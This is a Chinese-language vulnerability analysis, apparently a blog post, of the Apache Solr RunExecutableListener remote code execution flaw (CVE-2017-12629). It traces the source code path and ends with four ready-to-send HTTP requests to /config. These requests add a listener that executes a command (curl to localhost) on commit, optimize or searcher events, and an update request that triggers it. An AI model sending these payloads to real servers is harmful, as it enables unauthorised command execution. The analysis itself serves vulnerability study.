add-listener 被 - 当做分隔符，分别赋值给 pcs[0]、pcs[1] （并不是说 pcs 是个数组，只是这样表示方便点）  
那么经过第一个 if 就进入了 else 中，  
prefix = pcs[0] = add，  
name = pcs[1] = listener  
第二个if也是满足的，第一个条件是 cmdPrefixes 中是否包含当前的 prefix，这个是ok的  
第二个判断是， namedPlugins 中是否包含 key 值为 name 的
这个 namedPlugins 在 SolrConfigHandler 类里的 static 块中被初始化
我们跟着去看看 SolrConfig.plugins
在 static 块中，最后一句就是 namedPlugins 的赋值语句，将 map 转换成不可修改的映射
因为在 SolrConfig.plugins 中，发现了 options 为 REQUIRE_NAME_IN_OVERLAY 的标志，那么它也是在
namedPlugins 中的，所以我们第二个条件满足
回到 handleCommands 函数中，接着将其 PluginInfo 跟据 name 提取出来赋值给 info  
第三个 if 肯定是进入 else 的
那么，解释下参数：info 是 listener plugin 的info，op 是 json 处理后的数据，overlay
是之前获取的配置信息，第四个参数很明显为 true
跟进 updateNamedPlugin 函数
那么从 payload 中获得 class 的信息：solr.RunExecutableListener  
将其 class name 赋值给 clz
接下来的三个 getMap 操作，我们一个个看下这些常量的值
这个操作，仅仅是为了检测 json 中是否有这些信息，如果没有的话就记录 error 并返回空，然后在第一个 if 判断中就直接return
overlay了，这个并不影响
因为之前的 overlay中，本来就是包含 listener 这个 plugin 的
回到handleCommands中
这个 rce 是需要 solrcloud 的，而这里面是使用 Zookeeper 作为 solrcloud 集群的配置信息中心，同一管理 solrcloud
的配置，比如 solrconfig.xml 之类的
那么这个if条件应该是满足的，后续的操作中，大致是将 overlay 作为配置信息，写入了 configoverlay.json 配置文件中，并且设置到
zookeeperclient 中，然后将其配置丢给下一个 solr（意思是当 update 或者其他操作会触发 core.reload
的时候，配置信息会被修改），这样，我们就相当于控制了 solrconfig.xml ，但实际上 solrconfig.xml 是不可更改的，只是程序启动后
configoverlay.json 中的配置信息可以覆盖（从 /config 处 post
的配置信息，是会一直存在于集群的配置信息中的，也就是说，如果这个分布式集群一直工作着，那么payload会一直存在）
那么 solrconfig.xml 可以做些什么？  
它主要定义了 solr 的一些处理规则，包括索引数据的存放位置，更新，删除，查询的一些规则配置，还有一些索引存储方案，handler
的配置，请求转发器的配置，关于事件监听器的配置...等等
现在，我们先去看看在 core.reload 操作后，会被调用的 CommitTracker 里的 run，其他部分不贴了，贴rce触发相关的东西
这个 command 和后面的判断有极大的关系，但是他的成员变量都是可以在 url 中设置的
这个 core.getUpdateHandler().commit() 的结果是 DirectUpdateHandler2 里的 commit，因为只有
DirectUpdateHandler2 里重写了这个 commit 函数  
跟进去看看，代码太长，只贴关键点
第一处callback
第二处callback  
这两处的callback没啥特殊要求，只需要满足if判断即可，条件都是 cmd 里的成员变量值，cmd既是之前的 command，只要不在 url
中给参数值，那么都是默认为 false的
先跟入第一处的 callback，在UpdateHandler 中：
第二处的callback，同样也在 UpdateHandler 中：
两处的 callback 都是先遍历 listener 集合，然后直接调用其 postCommit 函数  
这里先记一笔，optimizeCallbacks 和 commitCallbacks 是怎么来的？
因为之前加载的是 solr.RunexecutableListener ，所以对应调用的是它的 postCommit ，跟进去
调用了 exec，继续跟
这里就调用了 Runtime.getRuntime().exec 执行了命令
其中 cmd 、envp、dir 分别对应之前payload中的 exe、env（设置环境变量，payload中并没有设置），dir
ok，这里已经触发了 rce，回到刚才的问题  
optimizeCallbacks 和 commitCallbacks 是怎么来的？
这里为了和前文的 core.reload 重载 core 操作相结合，所以就反向跟踪了，那么我们去看看 SolrCore 中的构造函数，因为每次重载
core 操作，肯定会去调用 SolrCore 的构造函数
在 SolrCore 中，找到三处很值得关注的调用：
第一处
看名字像是 Listener 的初始化
第二处
还记得之前在 CommitTracker 中 run 里调用的 core.getUpdateHandler().commit(command) 么，这个
core.getUpdateHandler() 就是获取的这个 initUpdateHandler(updateHandler) 的结果
第三处
Searcher 的初始化
#### 先跟进 initListeners 函数
这一长串的调用：solrConfig.getPluginInfos(SolrEventListener.class.getName())  
是提取了集群里除了一些自带的listener，还有之前我们payload中自己添加的 listener ，然后做了一个遍历  
将其 event 属性为'newSearcher' 和 'firstSearcher' 的话，那么就去创建实例并且分别加入
newSearcherListeners 和 firstSearcherListeners 中
#### 再跟进 initUpdateHandler ：
在 core.reload 发生的时候，形参 updateHandler 就是 DirectUpdateHandler2 的实例  
同时，无论是 updateHandler 是否为空，都会去创建一个新的 UpdateHandler，那么肯定会调用其构造函数，我们去看看
UpdateHandler 的构造函数
只截取了一部分，这个 parseEventListeners 仅仅是看名字就足以引起我们注意了，跟进去
又是提取的集群里的 Listeners 配置信息，然后比对他们的 event 属性，如果是 'postCommit' 和 'postOprimize' 的
listener 就分别加入到 commitCallbacks 、optimizeCallbacks中
这里也和之前的 callback 函数调用出相结合了，知道了optimizeCallbacks 和 commitCallbacks 是怎么来的
#### 最后去跟一下 initSearcher ：
里面调用了 getSearcher ，跟进去  
函数体略长，只贴关键处
这两处，都是重写了 Callable 的 get 函数，在 core.reload 操作后，会在线程里跑的  
具体处理就是将 firstSearcherListeners 和 newSearcherListeners 遍历出来后直接调用的 newSearcher
函数，这两个集合是在 initListeners 中进行初始化的
那么我们可以通过添加firstSearcherListeners 和 newSearcherListeners 的
RunExecutableListener 就可以调用它的 newSearcher 函数了，我们看看 RunExecutableListener 里的
newSearcher
他也是调用了 exec 函数，从而导致了 rce  
so，我们得到了两个 payload：1，event 为 newSearcher 2，event 为 firstSearcher
好的，SolrCore 里的三个关注点已经分析完了  
那么可以调用到 RunexecutableListener 里的 postCommit 和 newSearcher 函数的有如下方式（这两个函数都可以导致
rce）：  
1，调用postCommit：event 为 postCommit 或者 event 为 postOprimize  
2，调用newSearcher：event 为 newSearcher 或者 event 为 firstSearcher
其中 newSearcher 的调用，是在 /config 操作发生后，立即就能 core.reload ，所以可以立即触发 rce
postCommit 只能是在 /config 后，存储新的配置信息，然后再 /update 操作，就可以触发 core.reload 操作，从而触发
rce
这两个都是在重载 core 后发生的操作
对于先 /config 再 /update 然后触发 rce 的payload：  
并不是说由 /update 操作直接触发的rce，而是 zookeeper自己调用的 CommitTracker 里的 run，run又去调用了
DirectUpdateHandler2 里的 commit ，commit 中又去调用了 callPostCommitCallbacks
，callPostCommitCallbacks 里对 commitCallbacks 做遍历调用 postCommit，此时的
commitCallbacks 就是我们之前去 /config 添加的东西
因为配置信息一直存在，所以只要触发了 core.reload 就可以触发rce，比如我只是/config 操作了一次，但是只要去 /update
操作，那么就可以触发这个 payload
那么现在我们分别构造这4个payload  
（注意事项：程序是依靠 listener 的name来识别listner的，所以每次 config 一个 listner
的时候，name必须不同，其次是update 的时候，如果需要触发 postCommit 函数导致的rce，那么必须每次都是 update 不同的值，比如
"id":"test"，那么第二次去触发的时候，就应该这样 "id":"test1"）  
1.  
调用的 postCommit  
event 为 postCommit：
    POST /solr/newcollection/config HTTP/1.1
    Host: localhost:8983
    Connection: close
    Content-Type: application/json  
    Content-Length: 200
    {
      "add-listener" : {
        "event":"postCommit",
        "name":" newlistener-1",
        "class":"solr.RunExecutableListener",
        "exe":"curl",
        "dir":"/usr/bin/",
        "args":["http://127.0.0.1:8080"]
      }
    }
然后去 update 一下
    POST /solr/newcollection/config HTTP/1.1
    Host: localhost:8983
    Connection: close
    Content-Type: application/json  
    Content-Length: 15
    [{"id":"test"}]
event 为 postOprimize
    POST /solr/newcollection/config HTTP/1.1
    Host: localhost:8983
    Connection: close
    Content-Type: application/json  
    Content-Length: 202
    {
      "add-listener" : {
        "event":"postOprimize",
        "name":"newlistener-2",
        "class":"solr.RunExecutableListener",
        "exe":"curl",
        "dir":"/usr/bin/",
        "args":["http://127.0.0.1:8080"]
      }
    }
然后去 update 一下
    POST /solr/newcollection/config HTTP/1.1
    Host: localhost:8983
    Connection: close
    Content-Type: application/json  
    Content-Length: 16
    [{"id":"test1"}]
2.  
调用的 newSearcher  
event 为 newSearcher：
    POST /solr/newcollection/config HTTP/1.1
    Host: localhost:8983
    Connection: close
    Content-Type: application/json  
    Content-Length: 201
    {
      "add-listener" : {
        "event":"newSearcher",
        "name":"newSearcher-3",
        "class":"solr.RunExecutableListener",
        "exe":"curl",
        "dir":"/usr/bin/",
        "args":["http://127.0.0.1:8080"]
      }
    }
发包后即可触发 rce
event 为 firstSearcher
    POST /solr/newcollection/config HTTP/1.1
    Host: localhost:8983
    Connection: close
    Content-Type: application/json  
    Content-Length: 201
    {
      "add-listener" : {
        "event":"firstSearcher",
        "name":"newSearcher-4",
        "class":"solr.RunExecutableListener",
        "exe":"curl",
        "dir":"/usr/bin/",
        "args":["http://127.0.0.1:8080"]
      }
    }
本地验证一下：  
（因为是win的环境，就弹下计算机....args作为分辨他们的标志）
#### firstSearcher，立即触发
#### newSearcher，立即触发
#### postCommit ，update 操作后触发
_（先config后的返回页面如下）_
再去update
#### postOptimize，update操作后触发
**注意update的时候，要加参数**
意为设置 cmd.optimize 为 true
资料来源：  
cve-2017-12629-apache solr xxe & rce 漏洞分析：  
Solr/SolrCloud
SolrConfigHandler详解：  
Solr/SolrCloud SearchHandler
详解：  
Solr的安装与配置：  
分布式搜索之搭建SolrCloud：[http://www.cnblogs.com/1315925303zxz/p/6372004.html?utm_source=itdadao&utm_medium=referral](http://www.cnblogs.com/1315925303zxz/p/6372004.html?utm_source=itdadao&utm_medium=referral)  
solr两种预热方式（newSearcher、firstSearcher）：  
solrd的coolection,shard,replica,core
概念：